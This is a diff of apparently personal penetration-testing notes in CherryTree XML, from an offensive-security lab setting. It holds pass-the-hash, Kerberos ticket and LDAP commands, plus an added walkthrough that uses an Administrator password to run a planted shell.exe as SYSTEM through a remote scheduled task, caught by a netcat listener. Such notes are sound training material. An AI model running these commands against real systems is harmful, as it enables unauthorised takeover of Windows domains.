@@ -1605,7 +1605,7 @@ with mimikatz
           <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.11.1. -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
           <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.11.1. -hashes randomLMHASH:oeasdNTLMHASH</codebox>
         </node>
-        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1688335528">
+        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1688943845">
           <rich_text>
 </rich_text>
           <rich_text scale="h2">
@@ -1785,6 +1785,50 @@ runas /netonly /user:domain.local\user cmd
           <codebox char_offset="1630" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt</codebox>
           <codebox char_offset="1640" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mimikatz # kerberos::ptt</codebox>
           <codebox char_offset="1685" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Enter-PSSession -ComputerName dc01</codebox>
+          <node name="Getting a Shell from password" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688943845" ts_lastsave="1688943866">
+            <rich_text>First, let's restart out Netcat listener.
+&#13;Next, we'll spawn a new PowerShell session to install and run our scheduled task using the Administrator user's credentials.
+&#13;</rich_text>
+            <rich_text family="monospace">c:\windows\system32\inetsrv&gt;powershell&#13;
+powershell&#13;
+Windows PowerShell &#13;
+Copyright (C) Microsoft Corporation. All rights reserved.&#13;
+&#13;
+PS C:\windows\system32\inetsrv&gt; $pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force&#13;
+$pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force&#13;
+PS C:\windows\system32\inetsrv&gt;&#13;
+&#13;
+PS C:\windows\system32\inetsrv&gt; $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)&#13;
+$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)&#13;
+PS C:\windows\system32\inetsrv&gt;&#13;
+&#13;
+PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds&#13;
+Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds&#13;
+SUCCESS: The scheduled task "shell" has successfully been created.&#13;
+PS C:\windows\system32\inetsrv&gt;&#13;
+&#13;
+PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds&#13;
+Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds&#13;
+SUCCESS: Attempted to run the scheduled task "shell".&#13;
+PS C:\windows\system32\inetsrv&gt;&#13;
+</rich_text>
+            <rich_text>&#13;Once we run the scheduled task (as shown in the final command above), we are presented with a full system shell.
+&#13;</rich_text>
+            <rich_text family="monospace">kali@kali:~$ nc -lvp 445&#13;
+listening on [any] 445 ...&#13;
+192.168.120.108: inverse host lookup failed: Unknown host&#13;
+connect to [192.168.118.6] from (UNKNOWN) [192.168.120.108] 49731&#13;
+Microsoft Windows [Version 10.0.17763.1554]&#13;
+(c) 2018 Microsoft Corporation. All rights reserved.&#13;
+&#13;
+C:\Windows\system32&gt;whoami&#13;
+whoami&#13;
+nt authority\system&#13;
+</rich_text>
+            <codebox char_offset="42" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;kali@kali:~$ sudo nc -lvp 445&#13;
+listening on [any] 445 ...&#13;
+</codebox>
+          </node>
         </node>
         <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1688935332">
           <rich_text scale="h3">Enumerating smb via crackmapexec</rich_text>
@@ -2024,7 +2068,9 @@ To view all the json files generated by the commands above :
           <rich_text>
 
 or
-
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
 or 
 
 Without any user:
@@ -2057,7 +2103,9 @@ _________________________________________________________________
           <rich_text scale="h2">To check for admin</rich_text>
           <rich_text>
 
-
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
 </rich_text>
           <codebox char_offset="18" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -H ldap://10.11.1. -D ‘luser@support.htb’ -w 'password' -b 'dc=support,dc=htb'</codebox>
           <codebox char_offset="24" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -v -x -D &lt;user&gt;@HUTCH.OFFSEC -w &lt;password&gt; -b "DC=hutch,DC=offsec" -H ldap://10.11.1.</codebox>
